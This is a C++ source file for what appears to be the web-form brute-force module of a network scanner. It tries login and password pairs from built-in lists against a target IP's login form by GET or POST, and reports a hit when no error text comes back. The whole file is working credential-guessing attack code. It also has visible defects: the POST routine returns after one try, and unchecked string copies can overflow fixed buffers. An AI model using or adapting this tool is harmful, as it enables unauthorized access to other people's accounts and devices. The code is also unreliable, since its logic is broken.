#include "WebformWorker.h"
#include "FileUpdater.h"

lopaStr WFClass::parseResponse(const char *ip,
                               const int port,
                               const std::string *buffer,
                               const char* formVal,
                               const char *login,
                               const char *pass) {

    lopaStr result = {"UNKNOWN", "", ""};

    if(buffer->size() != 0)
    {
        if(Utils::ci_find_substr(*buffer, std::string(formVal)) == -1
                && Utils::ci_find_substr(*buffer, std::string("denied")) == -1
                && Utils::ci_find_substr(*buffer, std::string("Location:")) == -1
                && Utils::ci_find_substr(*buffer, std::string("Authentication required")) == -1
                && Utils::ci_find_substr(*buffer, std::string("invalid")) == -1
                && Utils::ci_find_substr(*buffer, std::string("err")) == -1
                && Utils::ci_find_substr(*buffer, std::string(".href")) == -1
                && Utils::ci_find_substr(*buffer, std::string(".replace")) == -1
                && Utils::ci_find_substr(*buffer, std::string(".location")) == -1
                && Utils::ci_find_substr(*buffer, std::string("501 not implemented")) == -1
                && Utils::ci_find_substr(*buffer, std::string("http-equiv")) == -1
                && Utils::ci_find_substr(*buffer, std::string("busy")) == -1
                && Utils::ci_find_substr(*buffer, std::string("later")) == -1
                && Utils::ci_find_substr(*buffer, std::string("forbidden")) == -1
                ) {

            stt->doEmition_BAGreenData("[+] " + QString(ip) + ":" + QString::number(port) + " - WF pass: " +
                                       QString(login) + ":" + QString(pass));
            strcpy(result.login, login);
            strcpy(result.pass, pass);
            return result;

        } else {

            if(Utils::ci_find_substr(*buffer, std::string("501 not implemented")) != -1) stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 501 Not Implemented.");

            if(Utils::ci_find_substr(*buffer, std::string("404 not found")) != -1) stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 404 Not Found.");

            return result;
        }
    }
    else return result;
}

lopaStr WFClass::doGetCheck(const char *ip,
                                  int port,
                                  char *actionVal,
                                  char *userVal,
                                  char *passVal,
                                  char *formVal) {

    lopaStr result = {"UNKNOWN", "", ""};
    int passCounter = 0;
    int firstCycle = 0;

    char login[128] = {0};
    char pass[32] = {0};

    for(int i = 0; i < MaxWFLogin; ++i)
    {
        if(!globalScanFlag) break;
        strcpy(login, wfLoginLst[i]);

        for(int j = firstCycle; j < MaxWFPass; ++j)
        {
            if(!globalScanFlag) break;
            strcpy(pass, wfPassLst[j]);

            int rSize = strlen(ip) + strlen(actionVal) + strlen(userVal) + strlen(login) + strlen(passVal) + strlen(pass) + 4;

            if(rSize > 256) {
                stt->doEmitionRedFoundData("[WF] Wrong request size! (" + QString(ip) + ":" + QString::number(port) + ")");
                return result;
            };

            char nip[256] = {0};
            sprintf(nip, "%s%s?%s=%s&%s=%s", ip, actionVal, userVal, login, passVal, pass);

            std::string buffer;
            if(Connector::nConnect(nip, port, &buffer) <= 0) return result;

            if(BALogSwitched) stt->doEmitionBAData("Checked WF: " + QString(ip) + ":" + QString::number(port) +
                                                   "; login/pass: "+ QString(login) + ":" + QString(pass) +
                                                   ";	- Progress: (" + 
												   QString::number((passCounter++/(double)(MaxWFPass*MaxWFLogin)) * 100).mid(0, 4) + "%)");

            result = parseResponse(ip, port, &buffer, formVal, login, pass);
            if(i == 0) ++i;
        }
        firstCycle = 1;
    }

    return result;
}

lopaStr WFClass::doPostCheck(const char *ip,
                                   int port,
                                   char *actionVal,
                                   char *userVal,
                                   char *passVal,
                                   char *formVal) {

    lopaStr result = {"UNKNOWN", "", ""};
    int passCounter = 0;
    int firstCycle = 0;

    char login[128] = {0};
    char pass[32] = {0};

    for(int i = 0; i < MaxWFLogin; ++i)
    {
        if(!globalScanFlag) break;
        strcpy(login, wfLoginLst[i]);

        for(int j = firstCycle; j < MaxWFPass; ++j)
        {
            if(!globalScanFlag) break;
            strcpy(pass, wfPassLst[j]);

            int rSize = strlen(ip) + strlen(actionVal) + strlen(userVal) + strlen(login) + strlen(passVal) + strlen(pass) + 4;

            if(rSize > 256) {
                stt->doEmitionRedFoundData("[WF] Wrong request size! (" + QString(ip) + ":" + QString::number(port) + ")");
                return result;
            };

            char nip[256] = {0};
            char postData[256] = {0};
            sprintf(nip, "%s%s", ip, actionVal);
            sprintf(postData, "%s=%s&%s=%s", userVal, login, passVal, pass);

            std::string buffer;
            if(Connector::nConnect(nip, port, &buffer, postData) <= 0) return result;

            if(BALogSwitched) stt->doEmitionBAData("Checked WF: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " +
                                                   QString(login) + ":" + QString(pass) + ";	- Progress: (" +
                                                   QString::number((passCounter/(double)(MaxWFPass*MaxWFLogin)) * 100).mid(0, 4) + "%)");
            ++passCounter;

            return parseResponse(ip, port, &buffer, formVal, login, pass);
            if(i == 0) ++i;
        }
        firstCycle = 1;
    }

    return result;
}

lopaStr WFClass::_WFBrute( const char *ip,
                                int port,
                                char *methodVal,
                                char *actionVal,
                                char *userVal,
                                char *passVal,
                                char *formVal) {

    lopaStr lps = {"UNKNOWN", "", ""};

    if(strstri(methodVal, "get") != NULL) {
        lps = doGetCheck(ip, port, actionVal, userVal, passVal, formVal);
    } else if(strstri(methodVal, "post") != NULL) {
        lps = doPostCheck(ip, port, actionVal, userVal, passVal, formVal);
    } else {
        stt->doEmitionFoundData("<a href=\"http://" + QString(ip) +
                                ":" + QString::number(port)
                                + "\"><font color=\"#c3c3c3\">" +
                                QString(ip) + ":" + QString::number(port) +
                                "</font></a> - [WF]: Unknown method.");
    };

    return lps;
}
